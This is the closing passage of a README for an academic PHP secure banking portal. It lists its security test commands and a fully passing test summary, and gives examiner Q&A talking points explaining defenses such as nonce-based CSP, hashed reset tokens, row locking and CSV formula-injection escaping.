php tests/test_export.php          # Statement export engine & injection defense
php tests/test_beneficiary_verify.php # Beneficiary 2-step verification & brute-force lock
php tests/test_velocity_limits.php # Multi-tier velocity limits (single/daily/monthly)
php tests/test_multi_account.php   # Multi-account support & IDOR isolation
php tests/test_notifications.php   # In-portal notification center & tenant isolation
php tests/test_device_fingerprint.php # Device fingerprinting & new-device alerts
php tests/test_admin_users.php     # Admin user management & account freezing
php tests/test_transaction_monitor.php # Heuristic anomaly detection & SOC triage

# Pillar F — Code Quality & Static Analysis
php tests/test_code_quality.php    # Static analysis, PHP 8 syntax lint, PDO config & hygiene
```

### Master Test Suite Execution Summary:
```text
================================================================================
 SECURE BANKING PORTAL — MASTER COMPREHENSIVE TEST RUNNER
 Covering: Pillar A (Security Depth), Pillar C (SOC/Observability), Pillar B (Banking), Pillar F (Code Quality)
 Running against PHP 8.2.12 on WINNT
================================================================================

 SUMMARY BY TEST SUITE
--------------------------------------------------------------------------------
 Test Suite                                                 | Total  | Pass   | Status
--------------------------------------------------------------------------------
 Pillar A [Baseline]: CSRF Synchronizer Token Pattern       | 4      | 4      | PASS
 Pillar A [A9, A10, A11]: Input Canonicalization & HPP...   | 8      | 8      | PASS
 Pillar A [A6, A7, A13]: Dual-Tier Sessions, Fixation ...   | 5      | 5      | PASS
 Pillar A [A3, A4]: Sliding-Window Rate Limit & Expone...   | 6      | 6      | PASS
 Pillar A [A5]: Secure Token-Based Password Reset (Has...   | 7      | 7      | PASS
 Pillar A [A12]: Cryptographic Audit Log Hash Chain & ...   | 6      | 6      | PASS
 Pillar A [A8]: Secure Avatar Upload & File Upload Def...   | 6      | 6      | PASS
 Pillar C [C1]: Server-Sent Events (SSE) Real-Time Sec...   | 5      | 5      | PASS
 Pillar C [C2]: 4-Tier Threat Severity Levels & Schema...   | 6      | 6      | PASS
 Pillar C [C3]: Heuristic Anomaly Detection (6 Behavio...   | 6      | 6      | PASS
 Pillar C [C4]: Dynamic User Security Posture Scoring ...   | 5      | 5      | PASS
 Pillar C [C5]: Prometheus-Compatible Metrics Scrape E...   | 6      | 6      | PASS
 Pillar C [C6]: CSV Formula Injection Defense (CWE-1236)    | 6      | 6      | PASS
 Pillar C [C7]: Automated SIEM Alerting Engine & Dedup...   | 6      | 6      | PASS
 Pillar C [C8/A12]: Cryptographic Audit Log Chain Cont...   | 5      | 5      | PASS
 Pillar B [B1]: Transaction Categories & Analytics Agg...   | 5      | 5      | PASS
 Pillar B [B2]: Scheduled & Recurring Transfers Engine      | 6      | 6      | PASS
 Pillar B [B3]: Statement Export Engine (CSV/PDF) & In...   | 5      | 5      | PASS
 Pillar B [B4]: Beneficiary 2-Step Verification & Brut...   | 6      | 6      | PASS
 Pillar B [B5]: Multi-Tier Transaction Velocity Limits...   | 5      | 5      | PASS
 Pillar B [B6]: Multi-Account Management & IDOR Accoun...   | 4      | 4      | PASS
 Pillar B [B7]: In-Portal Notification Center & Tenant...   | 5      | 5      | PASS
 Pillar B [B8]: Privacy-Preserving Device Fingerprinti...   | 6      | 6      | PASS
 Pillar B [B9]: Admin User Management, Account Freezin...   | 6      | 6      | PASS
 Pillar B [B10]: Heuristic Transaction Monitoring & Tr...   | 5      | 5      | PASS
 Pillar F: Code Quality, Static Analysis & Defensive S...   | 7      | 7      | PASS
================================================================================
 FINAL RESULTS: Total Tests: 147 | Passed: 147 | Failed: 0
 Success Rate: 100% | Execution Time: 18.783s
================================================================================
```

---

## 17. Examiner Viva Voce Defense & Master Q&A Bank (Pillars A, C, B, D, E, F)

For the complete 40+ question academic defense bank, refer to [`docs/VIVA_QA.md`](file:///Secure-Banking-Portal/docs/VIVA_QA.md). Key oral defense highlights include:

### Pillar A: Security Depth
- **Q: Why did you implement dynamic nonce-based CSP instead of static CSP?**  
  *Talking Point*: *"Static CSP frequently relies on `'unsafe-inline'` for modern dynamic user interfaces, which completely defeats XSS protection. By generating a 256-bit cryptographic nonce per HTTP request and requiring all executed scripts to bear that exact nonce, we achieve strict script execution control without compromising application responsiveness."*
- **Q: Why store password reset tokens as SHA-256 hashes instead of plain random strings?**  
  *Talking Point*: *"If the database is leaked via SQL injection or backup compromise, plaintext reset tokens in a `password_resets` table allow instant account takeover. Storing only the SHA-256 digest ensures the token cannot be weaponized without the 256-bit secret delivered out-of-band to the user."*
- **Q: How does the cryptographic hash chain enforce non-repudiation in audit logging?**  
  *Talking Point*: *"Traditional database audit logs can be covertly edited by a compromised DBA. In our portal, each log row embeds the SHA-256 hash of the previous row. Any manual alteration, deletion, or insertion retroactively breaks the mathematical hash chain, immediately alerting SOC operators."*

### Pillar B: Real-World Banking Features
- **Q: Why was `SELECT ... FOR UPDATE` required in `transfer_funds()`?**  
  *Talking Point*: *"Standard autocommit transactions suffer from race conditions where parallel threads read an identical balance before debiting, enabling double-spending. `SELECT ... FOR UPDATE` acquires an exclusive row lock, forcing concurrent transfer threads to wait until the active transaction commits or rolls back."*
- **Q: How did you prevent database deadlocks during multi-account row locking?**  
  *Talking Point*: *"Deadlocks occur when two concurrent transactions attempt to lock the same two accounts in reverse order. We eliminate circular lock waits by enforcing deterministic lock acquisition: both transactions always lock the account with the lower primary key ID first."*
- **Q: Why enforce velocity limits before database row locks?**  
  *Talking Point*: *"Evaluating single, daily, and monthly limits before acquiring pessimistic row locks rejects illegitimate high-volume transactions early in the pipeline, preventing unnecessary database lock contention and protecting system throughput."*

### Pillar C: Observability & SOC
- **Q: Why did you choose Server-Sent Events (SSE) over WebSockets for SOC telemetry?**  
  *Talking Point*: *"SOC telemetry is strictly unidirectional (server pushing events to analyst dashboards). WebSockets introduce bidirectional complexity and stateful daemons, whereas SSE runs over standard HTTP, reconnects automatically in browser `EventSource`, and supports non-blocking execution via `session_write_close()`."*
- **Q: What is CSV Formula Injection (CWE-1236) and how does your export pipeline prevent it?**  
  *Talking Point*: *"When statements are exported to CSV and opened in Excel, strings starting with `=`, `+`, `-`, or `@` execute as formulas via DDE. Our `csv_escape()` function sanitizes all outgoing fields by prefixing formula trigger characters with an apostrophe (`'`), forcing spreadsheet engines to render them as benign text."*

### Pillar D: Academic Rigor & Empirical Evidence
- **Q: What is the performance overhead of your defensive middlewares?**  
  *Talking Point*: *"Our empirical benchmarks demonstrate that perimeter defenses (CSP nonces, input canonicalization, CSRF token validation) operate in the sub-microsecond domain, adding less than 0.002 milliseconds total latency per request. Defensive rigor does not inherently compromise high-frequency financial throughput."*
- **Q: How does your implementation align with industry standards like OWASP ASVS?**  
  *Talking Point*: *"As documented in `docs/COMPARISON.md`, our portal achieves 100% compliance across all 18 core requirements of OWASP ASVS v4.0.3 Level 2 for financial applications, exceeding the standard through blockchain-grade cryptographic audit logging and real-time SSE telemetry."*

### Pillar E: Fintech UX & Defensive Frontend
- **Q: Why did you eliminate all inline scripts and styles across the entire application?**  
  *Talking Point*: *"Strict Content Security Policy (CSP) Level 2/3 mandates nonces or hashes for all executable scripts. Any inline `<script>` or inline `onclick` handler requires either `unsafe-inline` (which destroys XSS protection) or per-tag dynamic nonces. By architecting 100% of client interactivity into external, modular JavaScript files loaded via `<script src="...">`, we eliminate inline script injection vulnerabilities entirely and preserve strict, uncompromised CSP enforcement."*
- **Q: How does your UI mitigate DOM-based XSS when rendering dynamic user data?**  
  *Talking Point*: *"All dynamic data returned from API responses—including usernames, transaction remarks, beneficiary names, and audit log entries—is injected strictly through `Node.textContent` or via semantic DOM creation (`document.createElement`). At no point is untrusted user input concatenated into `innerHTML`, preventing DOM-based script execution even if malicious HTML tags or script blocks bypass input canonicalization."*
- **Q: Why did you self-host all fonts and icons instead of utilizing popular CDNs like Google Fonts or cdnjs?**  
  *Talking Point*: *"Relying on external CDNs introduces critical supply-chain vulnerabilities, cross-origin tracking vectors, and potential single points of failure. Self-hosting Inter and JetBrains Mono locally in `/fonts/` with WOFF2 compression ensures strict data sovereignty, eliminates third-party telemetry, and permits tighter CSP `font-src 'self'` and `style-src 'self'` policies without external origin holes."*

### Pillar F: Code Quality, Static Analysis & Defensive Standards
- **Q: Why did you configure PDO with `PDO::ATTR_EMULATE_PREPARES => false`?**  
  *Talking Point*: *"Default PDO emulation interpolates variables into SQL strings client-side with basic quotation wrapping, which can be vulnerable to multi-byte encoding mismatches (e.g. GBK/Big5 character set manipulation). Disabling emulation mandates native binary-protocol prepared statements (`COM_STMT_PREPARE` and `COM_STMT_EXECUTE`) on MySQL server, creating an unbridgeable architectural boundary between code structure and data values."*
- **Q: How does PHP 8 strict parameter and return type typing improve application security?**  
  *Talking Point*: *"Type confusion and loose coercion vulnerabilities (such as `0 == 'admin'` in legacy PHP) have historically led to authentication bypasses and parameter tampering. By enforcing explicit scalar types (`?string`, `int`, `array`, `bool`) on critical security services like CSRF token validation and input canonicalization, the engine rejects malformed data types at invocation time, eliminating parameter pollution and type juggling attacks."*
- **Q: How does the application safeguard against Information Disclosure (CWE-209) during database failures?**  
  *Talking Point*: *"With `PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION`, any database failure immediately throws a catchable exception rather than failing silently or echoing raw MySQL errors to the client. All controllers catch `Throwable`, record full diagnostics to the server's internal `error_log()`, and emit generic, standardized JSON error messages (`500 Internal Server Error`) to the client, preventing database schema, table names, or internal IP leakage."*

---

## License & Academic Integrity
Developed as an academic capstone project in Web Application Security. All vulnerabilities and defense mechanisms are implemented for educational, research, and defensive evaluation purposes.



